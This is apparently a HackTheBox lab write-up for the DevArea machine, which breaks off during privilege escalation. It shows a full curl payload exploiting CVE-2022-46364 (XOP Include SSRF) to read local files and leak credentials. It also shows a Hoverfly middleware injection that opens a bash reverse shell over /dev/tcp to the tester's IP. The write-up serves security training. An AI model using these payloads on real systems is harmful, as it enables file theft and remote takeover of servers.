# HackTheBox — DevArea

```bash
nmap -sV -sC 10.129.244.208 -T 4
```
![Nmap scan results](images/Pasted%20image%2020260627193638.png)

6 open ports: FTP (21), SSH (22), HTTP (80), Jetty (8080), Hoverfly proxy (8500), Hoverfly dashboard (8888). Anonymous FTP login allowed.

### FTP — employee-service.jar

```bash
ftp 10.129.244.208
#### Username: anonymous / Password: (blank)
cd pub
get employee-service.jar
```

![FTP anonymous login](images/Pasted%20image%2020260627190843.png)

## JAR Analysis

```bash
jadx -d /home/kali/hackTheBox/DevArea/output/ \
  /home/kali/hackTheBox/DevArea/employee-service.jar
```

![JAR decompilation](images/Pasted%20image%2020260627194402.png)

Decompiled successfully. Found 4 Java source files:
- `ServerStarter.java` — SOAP endpoint configuration
- `EmployeeService.java` — Service interface
- `EmployeeServiceImpl.java` — Service implementation
- `Report.java` — Data model

![Decompiled source files](images/Pasted%20image%2020260627195434.png)

## Exploitation

### CVE-2022-46364 — XOP Include SSRF

Confirmed SOAP endpoint via WSDL:

```bash
curl http://devarea.htb:8080/employeeservice?wsdl
```
![WSDL confirmation](images/Pasted%20image%2020260627195602.png)

WSDL confirmed `submitReport` operation with `employeeName` 
parameter accepting `xs:string` — our injection point.

Exploited CVE-2022-46364 by injecting XOP Include directive 
into `employeeName` field to read local files:

```bash
curl -X POST http://devarea.htb:8080/employeeservice \
  -H 'Content-Type: multipart/related; type="application/xop+xml"; boundary="b"; start="<root>"; start-info="text/xml"' \
  --data $'--b\r\nContent-Type: application/xop+xml; charset=UTF-8; type="text/xml"\r\nContent-ID: <root>\r\n\r\n<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><d:submitReport xmlns:d="http://devarea.htb/"><arg0><employeeName><x:Include xmlns:x="http://www.w3.org/2004/08/xop/include" href="file:///etc/systemd/system/hoverfly.service"/></employeeName><confidential>false</confidential></arg0></d:submitReport></s:Body></s:Envelope>\r\n--b--\r\n'
```

Response returned base64-encoded file contents. Decoded to reveal 
Hoverfly service credentials (redacted below for security):

```
User=dev_ryan
Group=dev_ryan
ExecStart=/opt/HoverFly/hoverfly -add -username admin -password [REDACTED] -listen-on-host 0.0.0.0
```

### Hoverfly RCE — Middleware Injection

Authenticated to Hoverfly API and obtained JWT token:

```bash
TOKEN=$(curl -s -X POST http://devarea.htb:8888/api/token-auth \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"[REDACTED]"}' | jq -r .token)
```

![Hoverfly token auth](images/Pasted%20image%2020260627200238.png)

### Shell — dev_ryan

Set up a Netcat listener:

```bash
nc -lvnp 4444
```

Injected reverse shell via Hoverfly middleware API:

```bash
TOKEN=$(curl -s -X POST http://devarea.htb:8888/api/token-auth \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"[REDACTED]"}' | jq -r .token)

curl -X PUT http://devarea.htb:8888/api/v2/hoverfly/middleware \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"binary":"bash","script":"bash -i >& /dev/tcp/10.10.15.45/4444 0>&1"}'
```

Triggered execution by routing a request through Hoverfly proxy:

```bash
curl http://devarea.htb:8500 --proxy http://devarea.htb:8888
```
![Reverse shell received](images/Pasted%20image%2020260627200647.png)

Shell received as `dev_ryan`.

## Privilege Escalation (in progress)

Enumeration found:

```bash
sudo -l
```

```
User dev_ryan may run the following commands on devarea:
    (root) NOPASSWD: /opt/syswatch/syswatch.sh, !/opt/syswatch/syswatch.sh web-stop, !/opt/syswatch/syswatch.sh web-restart
```

`syswatch.sh` usage:
```
SysWatch 1.0.0
Usage: /opt/syswatch/syswatch.sh <command> [args]
Commands:
  web                 Start web GUI
  web-stop            Stop web GUI
  web-restart         Restart web GUI
  web-status          Show web GUI status
  plugin <name> [args] Execute plugin
  plugins             List available plugins
  logs <file>         View log file
  logs --list         List available log files
  --version           Show version
  --help|-h|help      Show this help
```

Investigating `logs` and `plugin` subcommands for potential path traversal 
or arbitrary command execution as root. *(To be continued)*
